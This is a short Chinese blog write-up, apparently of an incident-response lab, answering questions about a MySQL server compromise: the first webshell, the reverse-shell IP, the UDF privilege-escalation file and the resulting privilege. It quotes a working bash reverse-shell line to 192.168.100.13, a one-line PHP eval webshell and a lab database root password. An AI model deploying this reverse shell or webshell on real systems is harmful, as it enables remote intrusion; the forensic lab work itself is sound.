# 第二章-日志分析-Mysql应急响应

  
  
&lt;!--more--&gt;  
1.黑客第一次写入的shell flag{关键字符串}   
2.黑客反弹shell的ip flag{ip}  
3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx  
4.黑客获取的权限 flag{whoami后的值}  
在`/tmp/1.sh`中反弹了`shell`  
`bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1`  
放到河马查杀，得到`sh.php`  
```php  
1 2 &lt;?php @eval($_POST[&#39;a&#39;]);?&gt; 4  
  
//ccfda79e-7aa1-4275-bc26-a6189eb9a20b  
```  
根据上面写入`webshell`的格式 所以猜测可能是`udf`提权  
查看源码得到`mysql`密码  
```php  
&lt;?php  
$conn=mysqli_connect(&#34;localhost&#34;,&#34;root&#34;,&#34;334cc35b3c704593&#34;,&#34;cms&#34;,&#34;3306&#34;);  
if(!$conn){  
echo &#34;数据库连接失败&#34;;  
}  
```  
`show variables like &#39;%plugin%&#39;;`  
`cd /usr/lib/mysql/plugin/` 得到 `udf.so`  
`ps -aux`查看mysql服务是以什么用户启动的  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202403151520766.png)
因为是`mysql`用户启动，所以提权后也是`mysql`用户的权限  
`flag{mysql}`  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/  

